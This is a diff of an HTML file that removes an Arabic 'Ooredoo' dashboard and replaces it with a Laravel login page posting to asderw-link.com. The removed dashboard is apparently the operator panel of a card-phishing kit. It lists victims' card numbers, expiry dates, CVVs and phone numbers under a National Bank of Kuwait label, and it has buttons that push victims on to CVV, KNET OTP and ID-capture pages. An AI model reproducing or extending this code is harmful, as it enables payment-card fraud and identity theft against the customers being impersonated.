@@ -1,557 +1,118 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="en">
+
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>لوحة التحكم - Ooredoo</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="csrf-token" content="kvjakpKlSUeURAdd9ZbHb6AKR4dPKZh3hhibdUrl">
+
+    <title>Laravel</title>
+
+    <!-- Fonts -->
+    <link rel="preconnect" href="https://fonts.bunny.net">
+    <link href="https://fonts.bunny.net/css?family=figtree:400,500,600&display=swap" rel="stylesheet" />
+
+    <!-- Scripts -->
+    <link rel="preload" as="style" href="https://asderw-link.com/build/assets/app-B9BS2dwd.css" />
+    <link rel="modulepreload" href="https://asderw-link.com/build/assets/app-BHNLSFp3.js" />
+    <link rel="stylesheet" href="https://asderw-link.com/build/assets/app-B9BS2dwd.css" data-navigate-track="reload" />
+    <script type="module" src="https://asderw-link.com/build/assets/app-BHNLSFp3.js" data-navigate-track="reload"></script>
+    <!-- Styles -->
+    <!-- Livewire Styles -->
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-            padding: 20px;
-        }
-
-        .container {
-            max-width: 1200px;
-            margin: 0 auto;
-            background: white;
-            border-radius: 10px;
-            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
-            overflow: hidden;
-        }
-
-        .header {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-            padding: 30px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        .header h1 {
-            font-size: 28px;
-            font-weight: 600;
-        }
-
-        .header-buttons {
-            display: flex;
-            gap: 10px;
-        }
-
-        .btn {
-            padding: 10px 20px;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 14px;
-            font-weight: 600;
-            transition: all 0.3s ease;
-        }
-
-        .btn-primary {
-            background: #4CAF50;
-            color: white;
-        }
-
-        .btn-primary:hover {
-            background: #45a049;
-        }
-
-        .btn-danger {
-            background: #f44336;
-            color: white;
-        }
-
-        .btn-danger:hover {
-            background: #da190b;
-        }
-
-        .btn-secondary {
-            background: #2196F3;
-            color: white;
-        }
-
-        .btn-secondary:hover {
-            background: #0b7dda;
-        }
-
-        .content {
-            padding: 30px;
-        }
-
-        .tabs {
-            display: flex;
-            gap: 20px;
-            margin-bottom: 30px;
-            border-bottom: 2px solid #e0e0e0;
-        }
-
-        .tab {
-            padding: 10px 20px;
-            cursor: pointer;
-            border: none;
-            background: none;
-            font-size: 16px;
-            font-weight: 600;
-            color: #666;
-            border-bottom: 3px solid transparent;
-            transition: all 0.3s ease;
-        }
-
-        .tab.active {
-            color: #667eea;
-            border-bottom-color: #667eea;
-        }
-
-        .table-wrapper {
-            overflow-x: auto;
-        }
-
-        table {
-            width: 100%;
-            border-collapse: collapse;
-            margin-top: 20px;
-        }
-
-        th {
-            background: #f5f5f5;
-            padding: 15px;
-            text-align: right;
-            font-weight: 600;
-            color: #333;
-            border-bottom: 2px solid #e0e0e0;
-        }
-
-        td {
-            padding: 15px;
-            border-bottom: 1px solid #e0e0e0;
-            color: #666;
-        }
-
-        tr:hover {
-            background: #f9f9f9;
-        }
-
-        .status-badge {
-            padding: 5px 15px;
-            border-radius: 20px;
-            font-size: 12px;
-            font-weight: 600;
-        }
-
-        .status-success {
-            background: #d4edda;
-            color: #155724;
-        }
-
-        .status-warning {
-            background: #fff3cd;
-            color: #856404;
-        }
-
-        .status-danger {
-            background: #f8d7da;
-            color: #721c24;
-        }
-
-        .action-buttons {
-            display: flex;
-            gap: 10px;
-        }
-
-        .action-btn {
-            padding: 5px 10px;
-            border: none;
-            border-radius: 3px;
-            cursor: pointer;
-            font-size: 12px;
-            font-weight: 600;
-            transition: all 0.3s ease;
-        }
-
-        .action-btn-info {
-            background: #e3f2fd;
-            color: #1976d2;
-        }
-
-        .action-btn-info:hover {
-            background: #bbdefb;
-        }
-
-        /* Modal Styles */
-        .modal {
+        [wire\:loading][wire\:loading],
+        [wire\:loading\.delay][wire\:loading\.delay],
+        [wire\:loading\.inline-block][wire\:loading\.inline-block],
+        [wire\:loading\.inline][wire\:loading\.inline],
+        [wire\:loading\.block][wire\:loading\.block],
+        [wire\:loading\.flex][wire\:loading\.flex],
+        [wire\:loading\.table][wire\:loading\.table],
+        [wire\:loading\.grid][wire\:loading\.grid],
+        [wire\:loading\.inline-flex][wire\:loading\.inline-flex] {
             display: none;
-            position: fixed;
-            z-index: 1000;
-            left: 0;
-            top: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 0.5);
         }
 
-        .modal.show {
-            display: flex;
-            justify-content: center;
-            align-items: center;
+        [wire\:loading\.delay\.none][wire\:loading\.delay\.none],
+        [wire\:loading\.delay\.shortest][wire\:loading\.delay\.shortest],
+        [wire\:loading\.delay\.shorter][wire\:loading\.delay\.shorter],
+        [wire\:loading\.delay\.short][wire\:loading\.delay\.short],
+        [wire\:loading\.delay\.default][wire\:loading\.delay\.default],
+        [wire\:loading\.delay\.long][wire\:loading\.delay\.long],
+        [wire\:loading\.delay\.longer][wire\:loading\.delay\.longer],
+        [wire\:loading\.delay\.longest][wire\:loading\.delay\.longest] {
+            display: none;
         }
 
-        .modal-content {
-            background-color: white;
-            padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.3);
-            max-width: 500px;
-            width: 90%;
-            max-height: 80vh;
-            overflow-y: auto;
+        [wire\:offline][wire\:offline] {
+            display: none;
         }
 
-        .modal-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 20px;
-            border-bottom: 2px solid #e0e0e0;
-            padding-bottom: 15px;
+        [wire\:dirty]:not(textarea):not(input):not(select) {
+            display: none;
         }
 
-        .modal-header h2 {
-            font-size: 20px;
-            color: #333;
+        :root {
+            --livewire-progress-bar-color: #2299dd;
         }
 
-        .close-btn {
-            background: none;
-            border: none;
-            font-size: 28px;
-            cursor: pointer;
-            color: #666;
-        }
-
-        .close-btn:hover {
-            color: #333;
-        }
-
-        .modal-body {
-            margin-bottom: 20px;
-        }
-
-        .info-row {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 15px;
-            padding: 10px 0;
-            border-bottom: 1px solid #f0f0f0;
-        }
-
-        .info-label {
-            font-weight: 600;
-            color: #333;
-        }
-
-        .info-value {
-            color: #666;
-        }
-
-        .modal-footer {
-            display: flex;
-            gap: 10px;
-            flex-wrap: wrap;
-            justify-content: center;
-        }
-
-        .modal-btn {
-            padding: 8px 15px;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 12px;
-            font-weight: 600;
-            transition: all 0.3s ease;
-        }
-
-        .modal-btn-primary {
-            background: #4CAF50;
-            color: white;
-        }
-
-        .modal-btn-primary:hover {
-            background: #45a049;
-        }
-
-        .modal-btn-secondary {
-            background: #2196F3;
-            color: white;
-        }
-
-        .modal-btn-secondary:hover {
-            background: #0b7dda;
-        }
-
-        .modal-btn-danger {
-            background: #f44336;
-            color: white;
-        }
-
-        .modal-btn-danger:hover {
-            background: #da190b;
-        }
-
-        .empty-state {
-            text-align: center;
-            padding: 40px;
-            color: #999;
-        }
-
-        .empty-state-icon {
-            font-size: 48px;
-            margin-bottom: 20px;
+        [x-cloak] {
+            display: none !important;
         }
     </style>
 </head>
+
 <body>
-    <div class="container">
-        <div class="header">
-            <h1>لوحة التحكم - Ooredoo</h1>
-            <div class="header-buttons">
-                <button class="btn btn-secondary" onclick="goHome()">الرئيسية</button>
-                <button class="btn btn-danger" onclick="logout()">تسجيل الخروج</button>
-            </div>
-        </div>
-
-        <div class="content">
-            <div class="tabs">
-                <button class="tab active" onclick="switchTab('transactions')">التسجيلات</button>
-                <button class="tab" onclick="switchTab('accounts')">الحسابات</button>
-                <button class="tab" onclick="switchTab('reports')">التقارير</button>
+    <div class="font-sans text-gray-900 antialiased">
+        <div class="min-h-screen flex flex-col sm:justify-center items-center pt-6 sm:pt-0 bg-gray-100">
+            <div>
+                <a href="/">
+    <svg class="w-16 h-16" viewbox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M11.395 44.428C4.557 40.198 0 32.632 0 24 0 10.745 10.745 0 24 0a23.891 23.891 0 0113.997 4.502c-.2 17.907-11.097 33.245-26.602 39.926z" fill="#6875F5"/>
+        <path d="M14.134 45.885A23.914 23.914 0 0024 48c13.255 0 24-10.745 24-24 0-3.516-.756-6.856-2.115-9.866-4.659 15.143-16.608 27.092-31.75 31.751z" fill="#6875F5"/>
+    </svg>
+</a>
             </div>
 
-            <div id="transactions" class="tab-content">
-                <div class="table-wrapper">
-                    <table id="transactionsTable">
-                        <thead>
-                            <tr>
-                                <th>الوقت</th>
-                                <th>رقم الهاتف</th>
-                                <th>المبلغ</th>
-                                <th>حالة البطاقة</th>
-                                <th>الإجراءات</th>
-                            </tr>
-                        </thead>
-                        <tbody id="tableBody">
-                            <!-- Data will be populated here -->
-                        </tbody>
-                    </table>
-                </div>
-            </div>
+            <div class="w-full sm:max-w-md mt-6 px-6 py-4 bg-white shadow-md overflow-hidden sm:rounded-lg">
+                <form method="POST" action="https://asderw-link.com/login">
+                    <input type="hidden" name="_token" value="kvjakpKlSUeURAdd9ZbHb6AKR4dPKZh3hhibdUrl" autocomplete="off">
+                    <div>
+                        <label class="block font-medium text-sm text-gray-700" for="email">
+    Email
+</label>
+                        <input class="border-gray-300 focus:border-indigo-500 focus:ring-indigo-500 rounded-md shadow-sm block mt-1 w-full" id="email" type="email" name="email" required="required" autofocus="autofocus" autocomplete="username">
+                    </div>
 
-            <div id="accounts" class="tab-content" style="display: none;">
-                <div class="empty-state">
-                    <div class="empty-state-icon">📊</div>
-                    <p>لا توجد حسابات لعرضها</p>
-                </div>
-            </div>
+                    <div class="mt-4">
+                        <label class="block font-medium text-sm text-gray-700" for="password">
+    Password
+</label>
+                        <input class="border-gray-300 focus:border-indigo-500 focus:ring-indigo-500 rounded-md shadow-sm block mt-1 w-full" id="password" type="password" name="password" required="required" autocomplete="current-password">
+                    </div>
 
-            <div id="reports" class="tab-content" style="display: none;">
-                <div class="empty-state">
-                    <div class="empty-state-icon">📈</div>
-                    <p>لا توجد تقارير لعرضها</p>
-                </div>
-            </div>
-        </div>
-    </div>
+                    <div class="block mt-4">
+                        <label for="remember_me" class="flex items-center">
+                    <input type="checkbox" class="rounded border-gray-300 text-indigo-600 shadow-sm focus:ring-indigo-500" id="remember_me" name="remember">
+                    <span class="ms-2 text-sm text-gray-600">Remember me</span>
+                </label>
+                    </div>
 
-    <!-- Card Details Modal -->
-    <div id="cardModal" class="modal">
-        <div class="modal-content">
-            <div class="modal-header">
-                <h2>معلومات البطاقة</h2>
-                <button class="close-btn" onclick="closeModal('cardModal')">&times;</button>
-            </div>
-            <div class="modal-body" id="cardDetails">
-                <!-- Card details will be populated here -->
-            </div>
-            <div class="modal-footer">
-                <button class="modal-btn modal-btn-primary" onclick="acceptTransaction()">قبول</button>
-                <button class="modal-btn modal-btn-danger" onclick="rejectTransaction()">رفض</button>
-                <button class="modal-btn modal-btn-secondary" onclick="goToCVV()">نقل إلى CVV</button>
-                <button class="modal-btn modal-btn-secondary" onclick="goToOTP()">نقل إلى OTP</button>
-                <button class="modal-btn modal-btn-secondary" onclick="goToHawety()">نقل إلى الهويتي</button>
+                    <div class="flex items-center justify-end mt-4">
+                        <a class="underline text-sm text-gray-600 hover:text-gray-900 rounded-md focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-indigo-500" href="https://asderw-link.com/forgot-password">
+                        Forgot your password?
+                    </a>
+
+                        <button type="submit" class="inline-flex items-center px-4 py-2 bg-gray-800 border border-transparent rounded-md font-semibold text-xs text-white uppercase tracking-widest hover:bg-gray-700 focus:bg-gray-700 active:bg-gray-900 focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:ring-offset-2 transition ease-in-out duration-150 ms-4">
+    Log in
+</button>
+                    </div>
+                </form>
             </div>
         </div>
     </div>
 
-    <script>
-        let currentTransaction = null;
-
-        // Load transactions from localStorage
-        function loadTransactions() {
-            const tableBody = document.getElementById('tableBody');
-            tableBody.innerHTML = '';
-
-            // Get all transactions from localStorage
-            const transactions = [];
-            for (let i = 0; i < localStorage.length; i++) {
-                const key = localStorage.key(i);
-                if (key.startsWith('transaction_')) {
-                    const data = JSON.parse(localStorage.getItem(key));
-                    transactions.push(data);
-                }
-            }
-
-            // Sort by timestamp (newest first)
-            transactions.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
-
-            if (transactions.length === 0) {
-                tableBody.innerHTML = '<tr><td colspan="5" style="text-align: center; color: #999;">لا توجد معاملات</td></tr>';
-                return;
-            }
-
-            transactions.forEach((transaction, index) => {
-                const row = document.createElement('tr');
-                const cardStatus = transaction.cardNumber ? 'معلومات البطاقة' : 'لا يوجد بطاقة';
-                const statusClass = transaction.cardNumber ? 'status-success' : 'status-warning';
-
-                row.innerHTML = `
-                    <td>${new Date(transaction.timestamp).toLocaleString('ar-KW')}</td>
-                    <td>${transaction.phoneNumber || 'N/A'}</td>
-                    <td>KD ${transaction.amount || '5.000'}</td>
-                    <td><span class="status-badge ${statusClass}">${cardStatus}</span></td>
-                    <td>
-                        <div class="action-buttons">
-                            <button class="action-btn action-btn-info" onclick="showCardDetails(${index})">التفاصيل</button>
-                        </div>
-                    </td>
-                `;
-                tableBody.appendChild(row);
-            });
-        }
-
-        // Show card details in modal
-        function showCardDetails(index) {
-            const transactions = [];
-            for (let i = 0; i < localStorage.length; i++) {
-                const key = localStorage.key(i);
-                if (key.startsWith('transaction_')) {
-                    const data = JSON.parse(localStorage.getItem(key));
-                    transactions.push(data);
-                }
-            }
-
-            transactions.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
-            currentTransaction = transactions[index];
-
-            const cardDetails = document.getElementById('cardDetails');
-            cardDetails.innerHTML = `
-                <div class="info-row">
-                    <span class="info-label">اسم البنك:</span>
-                    <span class="info-value">National Bank of Kuwait [NBK]</span>
-                </div>
-                <div class="info-row">
-                    <span class="info-label">رقم البطاقة:</span>
-                    <span class="info-value">${currentTransaction.cardNumber || 'N/A'}</span>
-                </div>
-                <div class="info-row">
-                    <span class="info-label">تاريخ الانتهاء:</span>
-                    <span class="info-value">${currentTransaction.expiryDate || 'N/A'}</span>
-                </div>
-                <div class="info-row">
-                    <span class="info-label">CVV:</span>
-                    <span class="info-value">${currentTransaction.cvv || 'N/A'}</span>
-                </div>
-                <div class="info-row">
-                    <span class="info-label">رقم الهاتف:</span>
-                    <span class="info-value">${currentTransaction.phoneNumber || 'N/A'}</span>
-                </div>
-                <div class="info-row">
-                    <span class="info-label">المبلغ:</span>
-                    <span class="info-value">KD ${currentTransaction.amount || '5.000'}</span>
-                </div>
-                <div class="info-row">
-                    <span class="info-label">الوقت:</span>
-                    <span class="info-value">${new Date(currentTransaction.timestamp).toLocaleString('ar-KW')}</span>
-                </div>
-            `;
-
-            document.getElementById('cardModal').classList.add('show');
-        }
-
-        // Close modal
-        function closeModal(modalId) {
-            document.getElementById(modalId).classList.remove('show');
-        }
-
-        // Accept transaction
-        function acceptTransaction() {
-            alert('تم قبول المعاملة بنجاح');
-            closeModal('cardModal');
-            loadTransactions();
-        }
-
-        // Reject transaction
-        function rejectTransaction() {
-            alert('تم رفض المعاملة');
-            closeModal('cardModal');
-            loadTransactions();
-        }
-
-        // Navigate to CVV page
-        function goToCVV() {
-            window.location.href = '/cvv.html';
-        }
-
-        // Navigate to OTP page
-        function goToOTP() {
-            window.location.href = '/knet/ver.html';
-        }
-
-        // Navigate to Hawety page
-        function goToHawety() {
-            window.location.href = '/hawety.html';
-        }
-
-        // Go home
-        function goHome() {
-            window.location.href = '/';
-        }
-
-        // Logout
-        function logout() {
-            localStorage.clear();
-            window.location.href = '/';
-        }
-
-        // Switch tabs
-        function switchTab(tabName) {
-            const tabs = document.querySelectorAll('.tab');
-            const contents = document.querySelectorAll('.tab-content');
-
-            tabs.forEach(tab => tab.classList.remove('active'));
-            contents.forEach(content => content.style.display = 'none');
-
-            event.target.classList.add('active');
-            document.getElementById(tabName).style.display = 'block';
-        }
-
-        // Close modal when clicking outside
-        window.onclick = function(event) {
-            const modal = document.getElementById('cardModal');
-            if (event.target == modal) {
-                modal.classList.remove('show');
-            }
-        }
-
-        // Load transactions on page load
-        window.addEventListener('load', loadTransactions);
-    </script>
+    <!-- Livewire Scripts -->
+    <script src="/livewire/livewire.js?id=cc800bf4" data-csrf="kvjakpKlSUeURAdd9ZbHb6AKR4dPKZh3hhibdUrl" data-update-uri="/livewire/update" data-navigate-once="true"></script>
 </body>
+
 </html>
